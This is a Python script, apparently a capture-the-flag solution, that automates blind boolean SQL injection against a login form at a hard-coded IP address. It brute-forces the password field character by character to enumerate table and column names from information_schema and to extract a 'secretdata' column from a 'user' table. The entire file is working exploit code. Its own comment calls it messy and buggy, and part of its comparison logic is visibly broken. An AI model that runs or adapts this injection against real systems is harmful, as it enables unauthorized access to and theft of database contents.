import requests as req
import string

s = string.printable[:-6].replace("'", "").replace('"', '').replace("\\", '').replace("%", "")

'''
Sorry if its really mess and buggy >_<
'''

def table_column():
    count_row = 0
    while True:
        found, count_char = 1, 1
        val, st, tmp = "", "", ""
        while True:
            for st in s:
                tmp = val + st
                pay = f"'||left((select concat(column_name,0x3a,table_name) from information_schema.columns limit {count_row},1),{count_char})=binary '{tmp}'||'"
                r = req.post("http://103.41.207.206:13003/", data={"username":"", "password":f"{pay}", "submit":"Login"}).text
                # print(pay)
                if len(r) > 29:
                    val += st
                    found = 1
                    print(val)
                    break
                c = 0
                for x in range(1, 4):
                    pay = f"'||left((select concat(column_name,0x3a,table_name) from information_schema.columns limit {count_row},1),{count_char+x})=binary '{tmp}'||'"
                    r_n = r = req.post("http://103.41.207.206:13003/", data={"username":"", "password":f"{pay}", "submit":"Login"}).text
                    if r_n == r:
                        c += 1
                    if c == 3:
                        found = 0
            if found == 0:
                print("change row")
                count_row += 1
                break
            count_char += 1

def data(table, column):
    count_row = 1
    while True:
        found, count_char = 1, 1
        val, st, tmp = "", "", ""
        while True:
            for st in s:
                tmp = val + st
                pay = f"'||left((select {column} from {table} limit {count_row},1),{count_char})=binary '{tmp}'||'"
                r = req.post("http://103.41.207.206:13003/", data={"username":"", "password":f"{pay}", "submit":"Login"}).text
                # print(pay)
                if len(r) > 29:
                    val += st
                    found = 1
                    print(val)
                    break
                c = 0
                for x in range(1, 4):
                    pay = f"'||left((select {column} from {table} limit {count_row},1),{count_char+x})=binary '{tmp}'||'"
                    r_n = r = req.post("http://103.41.207.206:13003/", data={"username":"", "password":f"{pay}", "submit":"Login"}).text
                    if r_n == r:
                        c += 1
                    if c == 3:
                        found = 0
            if found == 0:
                print("change row")
                count_row += 1
                break
            count_char += 1

if __name__ == '__main__':
    # table_column()
    data("user", "secretdata")

    


